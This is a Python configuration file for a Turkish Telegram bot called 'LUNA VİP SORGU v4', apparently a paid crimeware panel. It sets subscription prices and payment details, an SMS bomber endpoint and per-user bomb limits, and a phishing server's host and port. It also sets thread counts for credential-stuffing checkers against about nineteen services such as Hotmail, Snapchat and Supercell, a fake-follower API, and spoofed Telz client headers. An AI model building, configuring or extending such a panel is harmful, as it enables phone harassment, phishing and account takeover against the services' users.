# config.py — LUNA VİP SORGU v4

BOT_TOKEN = "BOT_TOKEN_BURAYA"
BOT_NAME = "LUNA VİP SORGU"
BOT_USERNAME = "lunavipsorgupanel_bot"
OWNER_ID = 7250471858
ADMIN_IDS = [7250471858]

CHANNEL_1 = "@luna_bot_destek"
CHANNEL_2 = "@glearya"

SUPPORT_GROUP_ID = -1003827548507
CONTACT_USERNAME = "@lunasloury"

PAYMENT_IBAN = "TR00 0000 0000 0000 0000 0000 00"
PAYMENT_PAPARA = "1234567890"
PAYMENT_CRYPTO = "TRC20: TXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
PAYMENT_CARD = "0000 0000 0000 0000"
PAYMENT_CARD_OWNER = "LUNA"

PLANS = {
    "1g": {"name": "1 Günlük", "price": 50, "days": 1},
    "1h": {"name": "1 Haftalık", "price": 200, "days": 7},
    "1a": {"name": "1 Aylık", "price": 400, "days": 30},
    "1y": {"name": "1 Yıllık", "price": 1300, "days": 365},
}

PHP_BASE = "http://localhost"

SMS_BOMBER_URL = "http://localhost/sms_bomber.php"
SMS_BOMBER_COUNT = 20

SMM_API_URL = "https://smm-panel-url/api/v2"
SMM_API_KEY = "SMM_API_KEY_BURAYA"
SMM_SERVICES = {
    "instagram": {"service_id": 1, "name": "Instagram Takipçi"},
    "youtube":   {"service_id": 2, "name": "YouTube Abone"},
    "tiktok":    {"service_id": 3, "name": "TikTok Takipçi"},
}

PHISHING_HOST = "0.0.0.0"
PHISHING_PORT = 5050
PHISHING_BASE_URL = "http://localhost:5050"

TELZ_BASE = "https://api.telz.com/"
TELZ_HEADERS = {
    "User-Agent": "Telz-Android/17.5.33",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
}
TELZ_MODE = "TEST_RANDOM_IDS"
TELZ_RATE_LIMIT = 300

CHECKER_THREADS = {
    "capcut": 80, "oyuncustore": 5, "exxen": 10, "tabii": 5,
    "epinfy": 5, "s2gepin": 5, "idefix": 3, "ssport": 5,
    "smsonay": 5, "beitod": 3, "medyabayim": 3, "ezglobal": 3,
    "oyundinar": 3, "hotmail": 50, "bkmkitap": 30, "snapchat": 5,
    "barlas": 3, "supercell": 5, "fenix": 10,
}

DB_FILE = "luna_bot.db"
LOG_DIR = "logs"

FREE_DAILY_QUERY = 7
FREE_DAILY_CHECKER = 2
FREE_DAILY_BOMB = 3

MAX_BOMB_AMOUNT = 20
MAX_CHECKER_COMBOS = 500